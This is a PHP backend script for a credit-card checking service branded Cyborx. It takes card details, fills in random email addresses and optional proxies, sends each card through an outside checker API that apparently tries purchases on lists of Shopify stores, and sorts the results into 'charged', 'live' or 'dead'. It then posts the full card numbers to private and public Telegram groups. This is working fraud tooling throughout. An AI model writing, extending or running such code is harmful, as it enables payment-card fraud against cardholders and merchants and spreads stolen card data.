<?php
declare(strict_types=1);
require_once __DIR__ . '/../../app/Bootstrap.php';
require_once __DIR__ . '/../../app/Db.php';
require_once __DIR__ . '/../../app/Telegram.php';
header('Content-Type: application/json; charset=utf-8');
use App\Db;
use App\Telegram;

$tempDir = __DIR__ . '/tmp';
if (!is_dir($tempDir)) {
    mkdir($tempDir, 0777, true);
}
if (empty($_SESSION['uid'])) {
    http_response_code(401);
    echo json_encode(['Response' => 'Session expired']);
    exit;
}
$pdo = Db::pdo();
$uid = (int)$_SESSION['uid'];
$username = $_SESSION['uname'] ?? ('tg_' . $uid);
$stmt = $pdo->prepare("SELECT telegram_id, first_name, last_name, status, credits FROM users WHERE id = ? LIMIT 1");
$stmt->execute([$uid]);
$userData = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$userData) {
    echo json_encode(['Response' => 'User not found']);
    exit;
}
$telegramId = $userData['telegram_id'];
$userFirstName = $userData['first_name'] ?? $username;
$userLastName = $userData['last_name'] ?? '';
$userStatus = strtoupper($userData['status'] ?? 'FREE');
$userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
$currentCredits = (int)$userData['credits'];
if ($userStatus === 'BANNED') {
    echo json_encode(['Response' => 'You are banned from using Cyborx.']);
    exit;
}
if ($currentCredits < 2) {
    echo json_encode(['Response' => 'Insufficient Credits']);
    exit;
}
$proxyHost = $_GET['host'] ?? '';
$proxyPort = (int)($_GET['port'] ?? 0);
$proxyUsername = $_GET['user'] ?? '';
$proxyPassword = $_GET['pass'] ?? '';
if (!empty($proxyHost) || !empty($proxyPort) || !empty($proxyUsername) || !empty($proxyPassword)) {
    if (empty($proxyHost) || $proxyPort <= 0) {
        echo json_encode(['Response' => 'Invalid Proxy Format: Host and Port are required']);
        exit;
    }
    $proxy = "$proxyHost:$proxyPort:$proxyUsername:$proxyPassword";
} else {
    $proxy = '';
}
$proxyRequired = isset($_GET['useProxy']) && $_GET['useProxy'] === '1';
if ($proxyRequired && empty($proxy)) {
    echo json_encode(['Response' => 'Proxy is required']);
    exit;
}
$hitSender = $_GET['hitSender'] ?? 'both';
if (!in_array($hitSender, ['charge', 'live', 'both'])) {
    echo json_encode(['Response' => 'Invalid hitSender value']);
    exit;
}
require_once 'ua.php';
$agent = new userAgent();
$ua = $agent->generate('windows');
function getBinInfo($binNumber, $ch, $ua) {
    $url = "https://bins.antipublic.cc/bins/" . urlencode($binNumber);
    $headers = [
        'Accept: application/json',
        'User-Agent: ' . $ua,
    ];
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPGET, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($httpCode !== 200) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $binData = json_decode($response, true) ?: [];
    return [
        'brand' => $binData['brand'] ?? 'UNKNOWN',
        'card_type' => $binData['type'] ?? 'UNKNOWN',
        'level' => $binData['level'] ?? 'STANDARD',
        'issuer' => $binData['bank'] ?? 'Unknown',
        'country_info' => ($binData['country_name'] ?? 'Unknown') . ' ' . ($binData['country_flag'] ?? '')
    ];
}
function updateCredits($pdo, $uid, $deduct, $isLive = false, $isCharged = false) {
    global $currentCredits;
    $newCredits = max(0, $currentCredits - $deduct);
    $lives = $isLive ? 1 : 0;
    $charges = $isCharged ? 1 : 0;
    $stmt = $pdo->prepare("UPDATE users SET credits = ?, lives = lives + ?, charges = charges + ? WHERE id = ?");
    $stmt->execute([$newCredits, $lives, $charges, $uid]);
    return $newCredits;
}
function sendTelegramMessage($botToken, $chatId, $messageHtml) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $messageHtml,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($postData),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return false;
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode === 200;
}
$botToken = $_ENV['TELEGRAM_BOT_TOKEN'] ?? '';
if (empty($botToken)) {
    echo json_encode(['Response' => 'Bot token missing']);
    exit;
}
function generateUserAgent() {
    $browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
    ];
    return $browsers[array_rand($browsers)];
}
function getSitesFromPackage($package) {
    $packageFiles = [
        'free' => 'normalsites.txt',
        'premium' => 'hqsites.txt'
    ];
    $file = __DIR__ . '/' . ($packageFiles[$package] ?? 'normalsites.txt');
    if (!file_exists($file)) {
        return [];
    }
    $sites = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    return array_map('trim', $sites);
}

$names = ["james", "morgan", "alex", "roman", "artirito", "fred", "yuan", "dhruv", "tokyo", "dustin"];
$name  = $names[array_rand($names)];
$num   = rand(10000, 99999);

$email = $name . $num . "@gmail.com";


$cc1 = $_GET['cc'] ?? '';
$site = $_GET['url'] ?? '';
$urlPackage = $_GET['urlPackage'] ?? '';
if (empty($cc1)) {
    echo json_encode(['Response' => 'Card details missing']);
    exit;
}
if (empty($site) && empty($urlPackage)) {
    echo json_encode(['Response' => 'Site URL or package required']);
    exit;
}
if ($urlPackage) {
    if ($userStatus === 'FREE' && !in_array($urlPackage, ['free'])) {
        echo json_encode(['Response' => 'Only Normal package available for free users']);
        exit;
    }
    $sites = getSitesFromPackage($urlPackage);
    if (empty($sites)) {
        echo json_encode(['Response' => 'No sites available for selected package']);
        exit;
    }
    $site = $sites[array_rand($sites)];
}
$cc_partes = explode("|", $cc1);
$cc = $cc_partes[0] ?? '';
$month = $cc_partes[1] ?? '';
$year = $cc_partes[2] ?? '';
$cvv = $cc_partes[3] ?? '';
if (empty($cc) || empty($month) || empty($year) || empty($cvv)) {
    echo json_encode(['Response' => 'Invalid card format']);
    exit;
}
$yearcont = strlen($year);
if ($yearcont <= 2) {
    $year = "20$year";
}
if ($month == "01") {
    $sub_month = "1";
} elseif ($month == "02") {
    $sub_month = "2";
} elseif ($month == "03") {
    $sub_month = "3";
} elseif ($month == "04") {
    $sub_month = "4";
} elseif ($month == "05") {
    $sub_month = "5";
} elseif ($month == "06") {
    $sub_month = "6";
} elseif ($month == "07") {
    $sub_month = "7";
} elseif ($month == "08") {
    $sub_month = "8";
} elseif ($month == "09") {
    $sub_month = "9";
} elseif ($month == "10") {
    $sub_month = "10";
} elseif ($month == "11") {
    $sub_month = "11";
} elseif ($month == "12") {
    $sub_month = "12";
}
$chBin = curl_init();
curl_setopt($chBin, CURLOPT_RETURNTRANSFER, true);
curl_setopt($chBin, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($chBin, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($chBin, CURLOPT_SSL_VERIFYHOST, false);
$bin = substr($cc1, 0, 6);
$binInfo = getBinInfo($bin, $chBin, $ua);
$brand = $binInfo['brand'];
$card_type = $binInfo['card_type'];
$level = $binInfo['level'];
$issuer = $binInfo['issuer'];
$country_info = $binInfo['country_info'];
curl_close($chBin);
$requestUrl = "https://cyborxchecker.com/api/autog.php?cc={$cc}|{$month}|{$year}|{$cvv}&email={$email}&site={$site}&proxy={$proxy}";
$req = curl_init();
curl_setopt_array($req, [
    CURLOPT_URL => $requestUrl,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HEADER => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_HTTPGET => true,
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_TIMEOUT => 50,
    CURLOPT_ENCODING => '',
    CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
    CURLOPT_USERAGENT => generateUserAgent(),
    CURLOPT_HTTPHEADER => [
        'Accept: application/json',
        'Cache-Control: no-cache',
        'Pragma: no-cache',
    ],
]);
$response = curl_exec($req);
// echo $response;
$curlErr = curl_error($req);
$httpCode = (int)curl_getinfo($req, CURLINFO_HTTP_CODE);
curl_close($req);
// $file = "shopii_cc_responses.txt";
// $handle = fopen($file, "a");
// $content = "cc = $cc1\nresponse = $response\n\n";
// fwrite($handle, $content);
// fclose($handle);
function esc($str) {
    return htmlspecialchars($str, ENT_QUOTES);
}
if ($response === false || empty($response) || $curlErr) {
    $totalamt = null;
    $gate = null;
    $gateway = null;
    $err = 'Request Failed or Empty Response' . ($curlErr ? ": $curlErr" : '');
} else {
    $responseData = json_decode($response, true);
    if (json_last_error() === JSON_ERROR_NONE && is_array($responseData)) {
        $totalamt = $responseData['Price'] ?? null;
        $gate = $responseData['Gate'] ?? null;
        $gateway = $gate ? "{$gate} {$totalamt}$" : null;
        $err = $responseData['Response'] ?? 'No Response Found';
    } else {
        $totalamt = null;
        $gate = null;
        $gateway = null;
        $err = 'Invalid JSON Response';
    }
}
if (
    strpos($response, 'ORDER_PLACED') ||
    strpos($response, 'Thank you') ||
    strpos($response, 'ThankYou') ||
    strpos($response, 'Thank You') ||
    strpos($response, 'thank_you') ||
    strpos($response, 'success') ||
    strpos($response, 'classicThankYouPageUrl') ||
    strpos($response, '"__typename":"ProcessedReceipt"') ||
    strpos($response, 'SUCCESS')
) {
    if ($hitSender === 'live' && $hitSender !== 'both') {
        $new_credits = updateCredits($pdo, $uid, 0);
        $result = json_encode([
            'status' => 'dead',
            'Response' => 'Charge hits disabled by configuration',
            'Price' => $totalamt,
            'Gateway' => $gateway,
            'cc' => $cc1,
            'credits' => $new_credits,
            'brand' => $brand,
            'card_type' => $card_type,
            'level' => $level,
            'issuer' => $issuer,
            'country_info' => $country_info
        ]);
        echo $result;
        exit;
    }
    $err = 'ORDER_PLACED ' . $totalamt;
    $new_credits = updateCredits($pdo, $uid, 5, false, true);
    $fullResult =
        "<b>#AutoShopifyGraphQL</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Charged 🔥\n" .
        "[ﾒ] <b>Response ➜</b> {$err}\n" .
        "[ﾒ] <b>Gateway ➜</b> {$gateway}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
        error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
    }
    $sendResult = sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    error_log("Private group message send result for -1002890276135: " . ($sendResult ? 'Success' : 'Failed'));
    $publicMessage =
        "<b>Hit Detected ✅</b>\n" .
        "━━━━━━━━\n" .
        "<b>User ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
        "<b>Status ➜</b> <b>Charged 🔥</b>\n" .
        "<b>Response ➜</b> {$err}\n" .
        "<b>Gateway ➜</b> Auto Shopify GraphQL\n" .
        "━━━━━━━━\n" .
        "<b>Hit From:</b> <a href=\"https://cyborx.net\">Cyborx</a>";
    sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
    $result = json_encode([
        'status' => 'charge',
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    echo $result;
    exit;
} elseif (strpos($response, '3DS_REQUIRED') || strpos($response, '/stripe/authentications/')|| strpos($response, '3D CC')) {
    if ($hitSender === 'charge' && $hitSender !== 'both') {
        $new_credits = updateCredits($pdo, $uid, 0);
        $result = json_encode([
            'status' => 'dead',
            'Response' => 'Live hits disabled by configuration',
            'Price' => $totalamt,
            'Gateway' => $gateway,
            'cc' => $cc1,
            'credits' => $new_credits,
            'brand' => $brand,
            'card_type' => $card_type,
            'level' => $level,
            'issuer' => $issuer,
            'country_info' => $country_info
        ]);
        echo $result;
        exit;
    }
    $err = '3DS REQUIRED';
    $new_credits = updateCredits($pdo, $uid, 1, true, false);
    $fullResult =
        "<b>#AutoShopifyGraphQL</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
        "[ﾒ] <b>Response ➜</b> {$err}\n" .
        "[ﾒ] <b>Gateway ➜</b> {$gateway}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
        error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
    }
    $sendResult = sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    error_log("Private group message send result for -1002890276135: " . ($sendResult ? 'Success' : 'Failed'));
    $result = json_encode([
        'status' => 'live',
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    echo $result;
    exit;
} elseif (strpos($response, 'INCORRECT_CVC') || strpos($response, 'INCORRECT CVC')) {
    if ($hitSender === 'charge' && $hitSender !== 'both') {
        $new_credits = updateCredits($pdo, $uid, 0);
        $result = json_encode([
            'status' => 'dead',
            'Response' => 'Live hits disabled by configuration',
            'Price' => $totalamt,
            'Gateway' => $gateway,
            'cc' => $cc1,
            'credits' => $new_credits,
            'brand' => $brand,
            'card_type' => $card_type,
            'level' => $level,
            'issuer' => $issuer,
            'country_info' => $country_info
        ]);
        echo $result;
        exit;
    }
    $err = 'INCORRECT_CVC';
    $new_credits = updateCredits($pdo, $uid, 3, true, false);
    $fullResult =
        "<b>#AutoShopifyGraphQL</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
        "[ﾒ] <b>Response ➜</b> {$err}\n" .
        "[ﾒ] <b>Gateway ➜</b> {$gateway}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
        error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
    }
    $sendResult = sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    $result = json_encode([
        'status' => 'live',
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    echo $result;
    exit;
} elseif (strpos($response, 'INCORRECT_ZIP') || strpos($response, 'INCORRECT ZIP')) {
    if ($hitSender === 'charge' && $hitSender !== 'both') {
        $new_credits = updateCredits($pdo, $uid, 0);
        $result = json_encode([
            'status' => 'dead',
            'Response' => 'Live hits disabled by configuration',
            'Price' => $totalamt,
            'Gateway' => $gateway,
            'cc' => $cc1,
            'credits' => $new_credits,
            'brand' => $brand,
            'card_type' => $card_type,
            'level' => $level,
            'issuer' => $issuer,
            'country_info' => $country_info
        ]);
        echo $result;
        exit;
    }
    $err = 'INCORRECT_ZIP';
    $new_credits = updateCredits($pdo, $uid, 3, true, false);
    $fullResult =
        "<b>#AutoShopifyGraphQL</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
        "[ﾒ] <b>Response ➜</b> {$err}\n" .
        "[ﾒ] <b>Gateway ➜</b> {$gateway}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
        error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
    }
    $sendResult = sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    $result = json_encode([
        'status' => 'live',
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    echo $result;
    exit;
} elseif (strpos($response, 'INSUFFICIENT_FUNDS') || strpos($response, 'INSUFFICIENT FUNDS')) {
    if ($hitSender === 'charge' && $hitSender !== 'both') {
        $new_credits = updateCredits($pdo, $uid, 0);
        $result = json_encode([
            'status' => 'dead',
            'Response' => 'Live hits disabled by configuration',
            'Price' => $totalamt,
            'Gateway' => $gateway,
            'cc' => $cc1,
            'credits' => $new_credits,
            'brand' => $brand,
            'card_type' => $card_type,
            'level' => $level,
            'issuer' => $issuer,
            'country_info' => $country_info
        ]);
        echo $result;
        exit;
    }
    $err = 'INSUFFICIENT_FUNDS';
    $new_credits = updateCredits($pdo, $uid, 3, true, false);
    $fullResult =
        "<b>#AutoShopifyGraphQL</b>\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
        "[ﾒ] <b>Response ➜</b> {$err}\n" .
        "[ﾒ] <b>Gateway ➜</b> {$gateway}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Info ➜</b> {$brand} - {$card_type} - {$level}\n" .
        "[ﾒ] <b>Bank ➜</b> {$issuer}\n" .
        "[ﾒ] <b>Country ➜</b> {$country_info}\n" .
        "━━━━━━━━━━━\n" .
        "[ﾒ] <b>Checked By ➜</b> " . esc($userFullName) . " [" . esc($userStatus) . "]\n" .
        "[ㇺ] <b>Dev ➜</b> Cyborx";
    if (!empty($telegramId)) {
        $sendResult = sendTelegramMessage($botToken, $telegramId, $fullResult);
        error_log("Individual message send result for $telegramId: " . ($sendResult ? 'Success' : 'Failed'));
    }
    $sendResult = sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    $result = json_encode([
        'status' => 'live',
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    echo $result;
    exit;
} elseif ($err === 'CARD_DECLINED') {
    $new_credits = updateCredits($pdo, $uid, 0);
    $result = json_encode([
        'status' => 'dead',
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    echo $result;
    exit;
} else {
    $new_credits = updateCredits($pdo, $uid, 0);
    $result = json_encode([
        'status' => 'dead',
        'Response' => $err,
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $brand,
        'card_type' => $card_type,
        'level' => $level,
        'issuer' => $issuer,
        'country_info' => $country_info
    ]);
    echo $result;
    exit;
}
?>